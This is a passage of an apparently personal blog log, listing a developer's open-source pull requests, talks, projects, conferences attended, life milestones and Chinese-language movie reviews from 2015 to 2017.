&lt;li&gt;[o] &lt;a href="https://github.com/fukuball/Trump-Driven-Development/pull/1"&gt;Add TrumpScript by M157q · Pull Request #1 · fukuball/Trump-Driven-Development · GitHub&lt;/a&gt; (2017/03/07)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/chihchun/personal-income-tax-docker/pull/1"&gt;Add support for identification via health insurance card by M157q · Pull Request #1 · chihchun/personal-income-tax-docker · GitHub&lt;/a&gt; (2017/03/24)  &lt;/li&gt;
&lt;li&gt;[?] &lt;a href="https://github.com/niklasb/webkit-server/pull/33"&gt;Fix string length computation for issue_command function by M157q · Pull Request #33 · niklasb/webkit-server · GitHub&lt;/a&gt; (2017/06/28)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/kkdai/bookmark-makerserver/pull/2"&gt;Fix typos in README by M157q · Pull Request #2 · kkdai/bookmark-makerserver · GitHub&lt;/a&gt; (2017/08/28)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/coleifer/peewee/pull/919"&gt;Add configuration check for sqlite by M157q � Pull Request #919 � coleifer/peewee � GitHub&lt;/a&gt; (2016/04/28)  &lt;/li&gt;
&lt;li&gt;[x] &lt;a href="https://github.com/vinta/awesome-python/pull/644"&gt;Add dryscrape into Web Crawling section. by M157q · Pull Request #644 · vinta/awesome-python · GitHub&lt;/a&gt; (2016/05/17)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/Unia/powersave/pull/3"&gt;[blacklist.conf] should be bluetooth not bluetooh by M157q � Pull Request #3 � Unia/powersave � GitHub&lt;/a&gt; (2016/05/19)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/travis-ci/dpl/pull/463"&gt;Fix Google Cloud SDK v114.0.0 GAE deploy error by M157q · Pull Request #463 · travis-ci/dpl · GitHub&lt;/a&gt; (2016/06/16)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/RainbowEngineer/taiwan_love_wins/pull/281"&gt;:rainbow_flag: 我支持婚姻平權 I support marriage equality by M157q · Pull Request #281 · RainbowEngineer/taiwan_love_wins · GitHub&lt;/a&gt; (2016/12/07)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/travis-ci/dpl/pull/549"&gt;Fix GAE deployment version error in gcloud sdk v138.0.0. by M157q · Pull Request #549 · travis-ci/dpl · GitHub&lt;/a&gt;  (2016/12/15)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/fntsrlike/slack-irc-syncbot"&gt;fntsrlike/slack-irc-syncbot · GitHub&lt;/a&gt; (2015/03/05)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/pcman-bbs/pcmanx/commit/fe71febde878142698609298c725c845bfeda8b9"&gt;fix typo (woild =&amp;gt; would) · pcman-bbs/pcmanx@fe71feb · GitHub&lt;/a&gt; (2015/03/14)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/chusiang/working-on-gnu-linux/pull/12"&gt;[Update 01.intro.md] Fix typo by M157q � Pull Request #12 � chusiang/working-on-gnu-linux � GitHub&lt;/a&gt; (2015/03/23)  &lt;/li&gt;
&lt;li&gt;[o] Restore shadowsocks - &lt;a href="https://github.com/M157q/shadowsocks"&gt;M157q/shadowsocks · GitHub&lt;/a&gt; (2015/08/22)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/pandeiro/arch-on-air/pull/10"&gt;Update some outdated links by M157q � Pull Request #10 � pandeiro/arch-on-air � GitHub&lt;/a&gt; (2015/09/10)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/odkq/curses-2048/pull/7"&gt;Fix executing  twice problem and pass flake8 by M157q � Pull Request #7 � odkq/curses-2048 � GitHub&lt;/a&gt; (2015/09/16)  &lt;/li&gt;
&lt;li&gt;[?] &lt;a href="https://github.com/jmcarp/robobrowser/pull/56"&gt;Fix button in form issue by M157q � Pull Request #56 � jmcarp/robobrowser � GitHub&lt;/a&gt; (2015/11/18)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/jminh/hour_of_code_python_2015/pull/3"&gt;Fix some typos by M157q � Pull Request #3 � jminh/hour_of_code_python_2015 � GitHub&lt;/a&gt; (2015/12/12)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/chusiang/the-art-of-command-line/pull/1"&gt;Use opencc -c s2twp for translation and split zh to zh-tw &amp;amp; zh-cn by M157q � Pull Request #1 � chusiang/the-art-of-command-line � GitHub&lt;/a&gt; (2015/12/14)  &lt;/li&gt;
&lt;li&gt;[x] &lt;a href="https://github.com/robbyrussell/oh-my-zsh/pull/4303"&gt;[plugins/pip] Add shortcut for upgrading pip outdated packages. by M157q · Pull Request #4303 · robbyrussell/oh-my-zsh · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Talk&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/07/18/golang-taipei-gathering-25/"&gt;Grumpy 簡介 - Golang Taipei Gathering #25&lt;/a&gt; (2017/07/18)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/"&gt;SITCON 2015 - Android Repackaged App Detection System&lt;/a&gt; (2015/03/07)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/m157q/sitcon2015-android-repackaged-app-detection-system-by-shunyi"&gt;SITCON2015 Android Repackaged App Detection System by shunyi // Speaker Deck&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2014  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2014/03/16/sitcon-2014-yi-nian-ban-qian-bu-hui-xie-wang-zhan-de-cai-niao-de-gu-shi/"&gt;SITCON 2014 - 一年半前不會寫網站的菜鳥的故事&lt;/a&gt; (2014/03/16)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Build some open source projects/applications&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/M157q/5g1"&gt;GitHub - M157q/5g1&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A simple crawler for &lt;a href="https://www.591.com.tw/"&gt;https://www.591.com.tw/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/M157q/hor2vec"&gt;GitHub - M157q/hor2vec&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Change your horizontal pure text to vertical with some options.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan"&gt;GitHub - pellaeon/fengyuan&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Django 刻一個 OwnCloud or Google Drive 出來的計劃，由 Pellaeon 開啟，我負責 Python 的部份，目前緩慢進行中。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/zdict"&gt;M157q/zdict · GitHub&lt;/a&gt; (2015/04)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/gettitle"&gt;M157q/gettitle · GitHub&lt;/a&gt; (2015/09)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/imageme"&gt;GitHub - M157q/imageme: A super simple image &amp;amp; video gallery server&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/linkedin2md"&gt;M157q/linkedin2md · GitHub&lt;/a&gt; (2015/12)  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/py-feedr"&gt;GitHub - M157q/py-feedr: A Python parser to tweet the latest updates from multiple RSS feeds.&lt;/a&gt; (2015/12)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS"&gt;https://twitter.com/M157q_News_RSS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Conferences&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/04/27/ithome-chatbot-day/"&gt;iThome #Chatbot Day&lt;/a&gt; (2017/04/27)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/06/09/pycon-tw-2017/"&gt;PyCon TW 2017&lt;/a&gt; (2017/06/09)  &lt;/li&gt;
&lt;li&gt;[o] [台灣資料科學年會之系列活動：深入淺出深度學習 (Dive into Deep Learning)]/posts/2017/08/12/dive-into-deep-learning-datasci-tw/) (2017/08/12)  &lt;/li&gt;
&lt;li&gt;[o] [台灣資料科學年會之系列活動：手把手的深度學習實務]/posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/) (2017/08/13)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/11/20/owasp-taiwan-week-2017/"&gt;OWASP Taiwan Week 2017&lt;/a&gt; (2017/11/20)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/06/03/pycon-tw-2016/"&gt;PyCon TW 2016&lt;/a&gt; (2016/06/03~05)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/07/23/hitcon-2016-cmt/"&gt;HITCON 2016 CMT&lt;/a&gt; (2016/07/22~23)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/08/25/coscup-2016"&gt;COSCUP 2016&lt;/a&gt; (2016/08/20~21)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/12/27/33c3-0/"&gt;33C3&lt;/a&gt; (2016/12/27~30)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] PyConAPAC 2015 (2015/06/05~06)  &lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/"&gt;PyCon APAC 2015 Notes and Thoughts - Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] COSCUP 2015 (2015/08/15~16)  &lt;/li&gt;
&lt;li&gt;[o] HITCON 2015 (2015/08/28~29)  &lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2015/08/29/hitcon-2015-iot-wargame/"&gt;HITCON 2015 IOT Wargame - Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Misc.&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2018  &lt;ul&gt;
&lt;li&gt;[ ] &lt;a href="https://github.com/M157q/Android-Repackaged-App-Detection-System"&gt;Finish the rest parts of the college graduation term project&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://imgur.com/a/m2PUa"&gt;2016 第十四任正副總統暨第九屆立法委員選舉監票&lt;/a&gt; (2016/01/16)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://twitter.com/M157q/status/737274967583166467"&gt;TypeRacer 達到最近 10 場 WPM 81 以上進入 Megaracer level，並創下個人新高 94 WPM&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;[o] Do my best for the job in Tagtoo as a Python engineer.  &lt;ul&gt;
&lt;li&gt;[o] Get familiar with the job content and server architecture then write the tutorial for newbie in R&amp;amp;D team.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://hackpad.com/iToolMan-T-cOJlcwLntzx"&gt;iToolMan Hoodie&lt;/a&gt; (2015/06)  &lt;/li&gt;
&lt;li&gt;[o] Exemption from military service (2015/08/06)  &lt;/li&gt;
&lt;li&gt;[o] Graduate from NCTU (2015/08/14)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://slot.miario.com/machines/134420"&gt;FunSlots 繽紛樂 - 創新技術名詞產生器&lt;/a&gt; with Apua. (2015/08/30)  &lt;/li&gt;
&lt;li&gt;[o] Install OpenWrt on Raspberry Pi (2015/09/01)  &lt;/li&gt;
&lt;li&gt;[o] Remove OS X and install Arch Linux on MacBook Air 2013 13' (2015/09/10)  &lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/"&gt;Install Arch Linux on MacBook Air Mid 2013 - Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] Get MT Driving License (2015/11/09)  &lt;/li&gt;
&lt;li&gt;[o] Get a job for CS-related company (2015/12/28)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Movies&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3783958/"&gt;La La Land (2016) - IMDb&lt;/a&gt; (2017/01/10)  &lt;ul&gt;
&lt;li&gt;會讓人想起往事的一部電影啊。也許一部好的音樂劇電影的要素，除了音樂和舞蹈的渲染力以外，就是要在完美中加上一點不完美，從而更貼近現實，進而觸動觀眾心靈深處某個已經上鎖的回憶吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3263904/"&gt;Sully (2016) - IMDb&lt;/a&gt; (2017/01/22)  &lt;ul&gt;
&lt;li&gt;那種奇蹟般成功迫降 Hudison 河面死裡逃生的緊張感真的有拍出來，讓人彷彿也身歷其境，流下幾滴感動的淚水。可能是前陣子才在短時間內搭了四次飛機，所以特別有感覺吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2674426/"&gt;Me Before You (2016) - IMDb&lt;/a&gt; (2017/01/22)  &lt;ul&gt;
&lt;li&gt;我絕對沒有說我覺得這部的人物設定啥的讓我感覺像是主角殘廢版的 Fifty Shades of Grey  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0109830/"&gt;Forrest Gump (1994) - IMDb&lt;/a&gt; (2017/02/12)  &lt;ul&gt;
&lt;li&gt;經典的《阿甘正傳》，除了首尾呼應以外，巧妙的編劇融入了許多美國的事件，以及當時的反戰與嬉皮的元素，導演說故事的手段很厲害，沒有複雜的劇情，卻能用一個不斷努力的虛構小人物阿甘來引起一般人的共鳴。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2543164/"&gt;Arrival (2016) - IMDb&lt;/a&gt; (2017/02/18)  &lt;ul&gt;
&lt;li&gt;台灣譯為《異星入境》  &lt;/li&gt;
&lt;li&gt;覺得導演的鋪陳和敘事手法挺棒的，但完全不能接受劇本上對於女主角的能力設定，給人一種 Deus ex machina 的感覺。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2277860/"&gt;Finding Dory (2016) - IMDb&lt;/a&gt; (2017/02/28)  &lt;ul&gt;
&lt;li&gt;I have short-term memory issue.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2709768/"&gt;The Secret Life of Pets (2016) - IMDb&lt;/a&gt; (2017/02/28)  &lt;ul&gt;
&lt;li&gt;喜歡狗跟貓的人看一定會覺得這動畫很可愛，因為有把狗和貓的一些小動作演出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1753383/"&gt;A Dog's Purpose (2017) - IMDb&lt;/a&gt; (2017/03/01)  &lt;ul&gt;
&lt;li&gt;台灣譯為《為了與你相遇》  &lt;/li&gt;
&lt;li&gt;算是一部哭點跟笑點兼具的電影吧，而且還離的很近。在電影院看時，座位兩旁的女生都有哭呀  &lt;/li&gt;
&lt;li&gt;真的很好奇到底是怎麼讓真的狗做出這麼到位的演技的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3315342/"&gt;Logan (2017) - IMDb&lt;/a&gt; (2017/05/28)  &lt;ul&gt;
&lt;li&gt;金鋼狼的完結系列啊，覺得這部挺中規中矩的，只是不知道會不會有 X-men 後續就是，感覺應該就是 X-men 系列的結尾了吧，挺感傷的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3896198/"&gt;Guardians of the Galaxy Vol. 2 (2017) - IMDb&lt;/a&gt; (2017/05/29)  &lt;ul&gt;
&lt;li&gt;一部又搞笑又感人的電影，劇情也很緊湊，裡頭充滿各種 1980 年代的哏。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] [&lt;a href="http://www.imdb.com/title/tt2250912/"&gt;Spider-Man: Homecoming (2017) - IMDb&lt;/a&gt;] (2017/07/11)  &lt;ul&gt;
&lt;li&gt;同事問說要不要一起去看，但因為有點受不了去年和今年一堆重啟拍攝和一堆已經像連續劇一樣多集的電影，起初有點猶豫。後來看到 IMDB 上的評價 8.2，爛番茄是 93%，就還是一起去看了。  &lt;/li&gt;
&lt;li&gt;劇本很普通，但兩個小時又十五分裡頭基本上沒啥冷場，重點是整部片裡頭沒有血、也沒有髒字、沒有性愛、甚至沒有接吻（被剪掉了），一副就是要大撈特撈暑假闔家觀賞的超級普遍級。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 太陽照常升起（&lt;a href="http://www.imdb.com/title/tt0769507/"&gt;The Sun Also Rises (2007) - IMDb&lt;/a&gt;）(2017/07/16)  &lt;ul&gt;
&lt;li&gt;姜文於 2007 年的作品，背景為中國的文革時期，帶有神奇的魔幻色彩，基本上第一次看的人大概都會覺得這是在拍什麼鬼。但電影中的一句台詞已經講明：「只能說你沒懂，不能說你沒看見。」  &lt;/li&gt;
&lt;li&gt;總共分成 4 個部份：瘋、戀、槍、夢，改編自&lt;a href="http://baike.baidu.com/item/%E5%A4%A9%E9%B9%85%E7%BB%92/12801619"&gt;《天鵝絨》&lt;/a&gt;這本小說，但劇情略有不同。  &lt;/li&gt;
&lt;li&gt;看了以下幾篇有雷的影評才比較知道姜文想表達什麼  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://rrgreen.wordpress.com/2007/09/25/%E3%80%8A%E5%A4%AA%E9%99%BD%E7%85%A7%E5%B8%B8%E5%8D%87%E8%B5%B7%E3%80%8B-%E3%80%8C%E9%87%8D%E8%A6%86%E3%80%8D%E7%9A%84%E3%80%8C%E4%B8%8D%E6%98%8E%E7%99%BD%E3%80%8D/"&gt;《太陽照常升起》  —「重覆」的「不明白」 | 月台衛星&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/movie/M.1195401691.A.9B7.html"&gt;[影評] 太陽照常升起：文革的魔幻童話 - 看板 movie - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20656609"&gt;电影《太阳照常升起》究竟要表达什么意思？ - 知乎&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_48392ee301000aee.html"&gt;破解姜文《太阳照常升起》的密码_王江月_新浪博客&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於中國文化大革命那個時期的事物不瞭解的人大概都看不懂這電影裡頭的一些細節。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 明天，我要和昨天的妳約會 （&lt;a href="http://www.imdb.com/title/tt5338222/"&gt;Tomorrow I Will Date with Yesterday's You (2016) - IMDb&lt;/a&gt;）(2017/07/16)  &lt;ul&gt;
&lt;li&gt;是部由小說改編，典型的加入一些特殊時空跳躍元素的日式愛情電影。  &lt;/li&gt;
&lt;li&gt;日本的愛情總是很能設定一些特殊的時空現象，不至於讓你覺得太過頭，卻能夠善加利用並找到一個連結點去做發揮，再加上日本電影嫻熟於都會情愛的細膩呈現，以及一如以往的悲中帶喜的劇情設定。  &lt;/li&gt;
&lt;li&gt;如果是理組的人建議不要太過深究電影裡頭對於時間的設定，不然會喪失一定的觀影樂趣 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3890160/"&gt;玩命再劫 (Baby Driver)&lt;/a&gt; (2017/08/05)  &lt;ul&gt;
&lt;li&gt;音樂貫串整個電影真的很酷，尤其是連人物與環境發出的聲音都剛好跟歌曲配合，真的挺棒的。  &lt;/li&gt;
&lt;li&gt;飆車的部份非常過癮簡直神乎其技  &lt;/li&gt;
&lt;li&gt;像是在看一部有音樂貫串的真人版 GTA 加上愛情元素的電影  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1219827/"&gt;攻殼機動隊 (Ghost in the Shell)&lt;/a&gt; (2017/08/06)  &lt;ul&gt;
&lt;li&gt;算是很基本的把原著的劇情呈現出來而已，沒有著墨太多草薙素子內心的掙扎以及留給觀眾多一點想像的空間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2316204/"&gt;異形：聖約 (Alien: Covenant)&lt;/a&gt; (2017/08/06)  &lt;ul&gt;
&lt;li&gt;以故事的時間點來說的話，算是接續上一部《異形：普羅米修斯》。劇情上算滿普通的，主要的重點應該還是在 David 這個機器人身上。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 《紅衣小女孩 2》  &lt;ul&gt;
&lt;li&gt;嗯，不知道該說什麼好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt5969696/"&gt;《軍艦島》&lt;/a&gt; (2017/09/12)  &lt;ul&gt;
&lt;li&gt;韓國真的很厲害，能把這種史實改編的題材搬上大螢幕，透過三個支線來推動整個主線的劇情，而且又有幽默的橋段，讓觀眾不會感到太無聊，又能夠讓觀眾瞭解歷史。  &lt;/li&gt;
&lt;li&gt;動作的部份也挺逼真的，最喜歡的是在澡堂的那場打戲，真的是很過癮。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1396484/"&gt;《牠 (It)》&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每個角色的個性都很鮮明，不會有記不太起來的角色，剛開始還在擔心一開頭就出現一大堆角色會不會造成節奏拖太長然後收不回來，但並沒有。  &lt;/li&gt;
&lt;li&gt;更深一層的意涵我認為應該是表達孩子很多的恐懼有時候是來自於父母的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0083658/"&gt;銀翼殺手 (Blade Runner)&lt;/a&gt; (2017/10/09)  &lt;ul&gt;
&lt;li&gt;以前就有聽過這部作品，但最近因為《銀翼殺手：2049》來看這部 1982 年的電影，才發現又是 Ridley Scott 的作品，算是我覺得很厲害的其中一位導演。  &lt;/li&gt;
&lt;li&gt;也是看了這部才知道原來 Ghost in the Shell 濃濃的 Cyber Punk 風格都是受到這部電影啟發的，也啟發了後來的 Matrix。  &lt;/li&gt;
&lt;li&gt;我很喜歡&lt;a href="https://www.youtube.com/watch?v=qR8eAvjASUc"&gt;這部影評&lt;/a&gt;的介紹，算是又讓我更瞭解了這整部電影，也才知道 Google 的 Android 系統和其型號 Nexus 都是在向這部電影致敬，有時間可能會把原著小說《機器人會夢見電子羊嗎》補完。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt6298600/"&gt;解憂雜貨店&lt;/a&gt; (2017/10/30)  &lt;ul&gt;
&lt;li&gt;小說改編的電影，很多看過的人說小說比較精彩，但我覺得電影的節奏和順序表現的滿好的，一開始還在想說時間這樣跳來跳去會不會讓觀眾看不懂，但還挺好理解的。  &lt;/li&gt;
&lt;li&gt;把幾個看似不相關的故事透過雜貨店串聯了起來，主要是因為小說改編所以劇本的層次性夠豐富，而且也有哭點，算是還不錯的小品吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://zh.wikipedia.org/wiki/%E5%A4%A7%E4%BD%9B%E6%99%AE%E6%8B%89%E6%96%AF"&gt;大佛普拉斯&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;透過身為社會底層的主角把台灣社會的荒謬現象刻畫得滿深刻的，不管是政商名流酒池肉林、宗教寄託太過、掛羊頭賣狗肉、新聞浮濫的現象。  &lt;/li&gt;
&lt;li&gt;很多的諷刺真的是讓人有很直接的體會，且導演不時穿插的旁白還滿有幫助的，整部片都講台語，而且也有很台式但不是豬哥亮或鐵獅玉琳瓏那種開別人玩笑的幽默。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://zh.wikipedia.org/zh-tw/%E8%A1%80%E8%A7%80%E9%9F%B3"&gt;血觀音&lt;/a&gt; (2017/12/04)  &lt;ul&gt;
&lt;li&gt;原本對於這部的題材就沒有很喜歡，有認識的在找說要不要一起去看的時候沒有看。  &lt;/li&gt;
&lt;li&gt;結果這部在今年的金馬獎得獎拿了最佳劇情、最佳女主角、最佳女配角、觀眾票選最佳影片以後，很多人都慕名去電影院買票觀影。  &lt;/li&gt;
&lt;li&gt;至於我則是因為在網路上看到有些影評提到其實背後是有些真實故事性的，但我自己是沒有感受到就是。  &lt;/li&gt;
&lt;li&gt;我自己的感覺是一開始的角色設定還算不錯，但到後面有點虎頭蛇尾的感覺，最後面給我的感覺就是搬上銀幕的比較有質感的台灣八點檔。  &lt;/li&gt;
&lt;li&gt;反而是美術和造型設計上我覺得算滿有水準的，但在這屆金馬只獲得提名沒有得獎。  &lt;/li&gt;
&lt;li&gt;我覺得在諷刺政商名流上又沒有可能是我自己不喜愛這類題材的關係吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2380307/"&gt;可可夜總會 (Coco)&lt;/a&gt; (2017/12/05)  &lt;ul&gt;
&lt;li&gt;真的是很棒的一部動畫電影，劇本的層次有，把墨西哥的民俗文化的獨特性呈現出來，而亡靈節也很能跟台灣的清明節產生共鳴。  &lt;/li&gt;
&lt;li&gt;還有個一定會讓大家產生共鳴的角色就是主角的祖母，每個人的家中一定都有這樣守舊不太願意改變的長輩，可能是父母，也可能是祖父母，觀眾自己多少都有像主角一樣違抗這些長輩的時候，所以很有代入感。  &lt;/li&gt;
&lt;li&gt;也是一部今年我覺得很棒的電影之一，看完會讓人想練吉他啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt7479718/"&gt;相愛相親&lt;/a&gt; (2017/12/15)  &lt;ul&gt;
&lt;li&gt;透過三代的女人來描述親情與愛情的電影。  &lt;/li&gt;
&lt;li&gt;透過很平實的敘述手法來描述，很多互動會讓人會心一笑，因為很貼近一般人的生活。  &lt;/li&gt;
&lt;li&gt;不同世代的人對於愛的表現也不同，於此產生的價值觀的代溝與衝突在這部電影也都有被闡述出來。  &lt;/li&gt;
&lt;li&gt;可以見到每個角色的不完美，但正因為不完美，所以真正的愛需要包容  &lt;/li&gt;
&lt;li&gt;很喜歡裡面的一句台詞：「一輩子都睡在一起也不代表就彼此相愛啊。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0076759"&gt;Star Wars Episode IV: A New Hope (1977)&lt;/a&gt; (2017/12/15)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0080684/"&gt;Star Wars: Episode V - The Empire Strikes Back (1980)&lt;/a&gt; (2017/12/16)  &lt;/li&gt;
